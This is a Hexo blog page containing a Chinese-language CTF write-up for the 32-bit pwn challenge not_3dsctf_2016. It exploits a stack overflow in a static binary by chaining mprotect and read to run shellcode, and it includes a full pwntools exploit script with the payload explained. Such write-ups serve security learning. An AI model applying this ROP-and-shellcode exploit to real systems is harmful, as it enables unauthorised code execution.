@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>32位shellcode使用mprotect提升权限执行shellcode | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="查看程序保护NX开启，栈不可执行打开 ida一下经典栈溢出看了一下函数窗，判断是静态程序那么没法用ret2libc gdb一下vmmap查看内存权限可以看到程序的内存没有一个是既可读(r)有可写(x)还可执行的(x)的 解题思路由于是静态程序没法用ret2libc，并且程序开启了NX保护，不能直接运行shellcode。 但是静态函数的好处是我们可以找到几乎任何需要的函数，所以可以选取一段内存注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="32位shellcode使用mprotect提升权限执行shellcode">
+<meta property="og:url" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="查看程序保护NX开启，栈不可执行打开 ida一下经典栈溢出看了一下函数窗，判断是静态程序那么没法用ret2libc gdb一下vmmap查看内存权限可以看到程序的内存没有一个是既可读(r)有可写(x)还可执行的(x)的 解题思路由于是静态程序没法用ret2libc，并且程序开启了NX保护，不能直接运行shellcode。 但是静态函数的好处是我们可以找到几乎任何需要的函数，所以可以选取一段内存注入">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/QQ%E6%88%AA%E5%9B%BE20230617192156.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/QQ%E6%88%AA%E5%9B%BE20230617192345.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/QQ%E6%88%AA%E5%9B%BE20230617192458.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/QQ%E6%88%AA%E5%9B%BE20230617192911.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/QQ%E6%88%AA%E5%9B%BE20230617193830.png">
+<meta property="article:published_time" content="2023-06-17T11:19:51.000Z">
+<meta property="article:modified_time" content="2023-06-17T12:06:05.810Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/QQ%E6%88%AA%E5%9B%BE20230617192156.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://dinkjun.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-32位shellcode使用mprotect提升权限执行shellcode" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/" class="article-date">
+  <time datetime="2023-06-17T11:19:51.000Z" itemprop="datePublished">2023-06-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      32位shellcode使用mprotect提升权限执行shellcode
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="查看程序保护"><a href="#查看程序保护" class="headerlink" title="查看程序保护"></a>查看程序保护</h1><p>NX开启，栈不可执行打开<br><img src="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/QQ%E6%88%AA%E5%9B%BE20230617192156.png" alt="Alt text"></p>
+<h1 id="ida一下"><a href="#ida一下" class="headerlink" title="ida一下"></a>ida一下</h1><p>经典栈溢出<br><img src="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/QQ%E6%88%AA%E5%9B%BE20230617192345.png" alt="Alt text"><br>看了一下函数窗，判断是静态程序那么没法用ret2libc<br><img src="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/QQ%E6%88%AA%E5%9B%BE20230617192458.png" alt="Alt text"></p>
+<h1 id="gdb一下"><a href="#gdb一下" class="headerlink" title="gdb一下"></a>gdb一下</h1><h3 id="vmmap查看内存权限"><a href="#vmmap查看内存权限" class="headerlink" title="vmmap查看内存权限"></a>vmmap查看内存权限</h3><p>可以看到程序的内存没有一个是既可读(r)有可写(x)还可执行的(x)的<br><img src="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/QQ%E6%88%AA%E5%9B%BE20230617192911.png" alt="Alt text"></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>由于是静态程序没法用ret2libc，并且程序开启了NX保护，不能直接运行shellcode。</p>
+<p>但是静态函数的好处是我们可以找到几乎任何需要的函数，所以可以选取一段内存注入shellcode。</p>
+<p>先调用mprotect函数提升这段内存的权限，再调用read函数把shellcode写入目标内存，最后把返回地址覆盖为这段内存的地址即可获得shell。</p>
+<h1 id="关于mprotect函数"><a href="#关于mprotect函数" class="headerlink" title="关于mprotect函数"></a>关于mprotect函数</h1><h4 id="注意看这一段"><a href="#注意看这一段" class="headerlink" title="注意看这一段:"></a>注意看这一段:</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">需要注意的是，指定的内存区间必须包含整个内存页</span><br><span class="line">（4K），起始地址 start 必须是一个内存页的起始地</span><br><span class="line">址，并且区间长度 len 必须是页大小的整数倍</span><br></pre></td></tr></table></figure>
+<h4 id="一页也就是4k-4X1024-也就是0x1000也就是说mprotect函数提升的目标内存的地址的低三位必须全部为0。"><a href="#一页也就是4k-4X1024-也就是0x1000也就是说mprotect函数提升的目标内存的地址的低三位必须全部为0。" class="headerlink" title="一页也就是4k(4X1024)也就是0x1000也就是说mprotect函数提升的目标内存的地址的低三位必须全部为0。"></a>一页也就是4k(4X1024)也就是0x1000也就是说mprotect函数提升的目标内存的地址的低三位必须全部为0。</h4><p><img src="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/QQ%E6%88%AA%E5%9B%BE20230617193830.png" alt="Alt text"></p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./not_3dsctf_2016&quot;</span>)</span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&quot;debug&quot;</span></span><br><span class="line">#elf = <span class="title function_">ELF</span>(<span class="string">&quot;./not_3dsctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">py_addr = <span class="number">0x80489A0</span></span><br><span class="line">read_addr = <span class="number">0x806e200</span></span><br><span class="line">mprotect_addr = <span class="number">0x806ed40</span></span><br><span class="line">pop_3_addr = <span class="number">0x8063b9b</span></span><br><span class="line">bss_addr = <span class="number">0x80ea000</span></span><br><span class="line">#read2 = elf.<span class="property">sym</span>[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">#print<span class="string">&quot;read2-&gt;&quot;</span>,<span class="title function_">hex</span>(read2)</span><br><span class="line">payload = b<span class="string">&quot;A&quot;</span>*<span class="number">45</span> + <span class="title function_">p32</span>(mprotect_addr)</span><br><span class="line">payload += <span class="title function_">p32</span>(pop_3_addr) + <span class="title function_">p32</span>(bss_addr) + <span class="title function_">p32</span>(<span class="number">0x100</span>) + <span class="title function_">p32</span>(<span class="number">0x7</span>)</span><br><span class="line">payload += <span class="title function_">p32</span>(read_addr) + <span class="title function_">p32</span>(pop_3_addr) + <span class="title function_">p32</span>(<span class="number">0x0</span>) + <span class="title function_">p32</span>(bss_addr) + <span class="title function_">p32</span>(<span class="number">0x100</span>) + <span class="title function_">p32</span>(bss_addr)</span><br><span class="line"></span><br><span class="line">#gdb.<span class="title function_">attach</span>(io,b<span class="string">&quot;b main&quot;</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(payload)</span><br><span class="line">shellcode = <span class="title function_">asm</span>(shellcraft.<span class="title function_">sh</span>(),arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">sendline</span>(shellcode)</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+<h1 id="关于构造payload"><a href="#关于构造payload" class="headerlink" title="关于构造payload"></a>关于构造payload</h1><p>首先填充45个垃圾数据把返回地址覆盖为mprotect函数的地址。</p>
+<p>然后由于mprotect函数使用到了3个参数，由于函数传参是使用push的，为了后续能够再次使用ret(劫持返回地址)。</p>
+<p>因此我们需要找连续三个pop的gadget来保证在调用完mprotect函数之后还原栈(堆栈还原)。所以mprootect函数的返回地址为pop_3_addr。</p>
+<p>之后的三个位置就是mprotect的三个参数了，分别为要修改权限的内存地址、修改的长度、修改的权限。</p>
+<p>后门就是调用read函数了，和调用mprotect函数同理，read函数的返回地址为pop_3_addr，后面的三个位置为read函数的参数，最后返回目标内存地址让程序执行shellcode即可。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = b<span class="string">&quot;A&quot;</span>*<span class="number">45</span> + <span class="title function_">p32</span>(mprotect_addr)</span><br><span class="line">payload += <span class="title function_">p32</span>(pop_3_addr) + <span class="title function_">p32</span>(bss_addr) + <span class="title function_">p32</span>(<span class="number">0x100</span>) + <span class="title function_">p32</span>(<span class="number">0x7</span>)</span><br><span class="line">payload += <span class="title function_">p32</span>(read_addr) + <span class="title function_">p32</span>(pop_3_addr) + <span class="title function_">p32</span>(<span class="number">0x0</span>) + <span class="title function_">p32</span>(bss_addr) + <span class="title function_">p32</span>(<span class="number">0x100</span>) + <span class="title function_">p32</span>(bss_addr)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/" data-id="clizyehvs0003ikv985k6gmgf" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">32位shellcode:绕过strcmp函数和计算shellcode在栈上的偏移。</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/">32位shellcode使用mprotect提升权限执行shellcode</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/">32位shellcode:绕过strcmp函数和计算shellcode在栈上的偏移。</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/">32位shellcode(其实是32位syscall)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/07/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/">32位格式化字符串bss</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
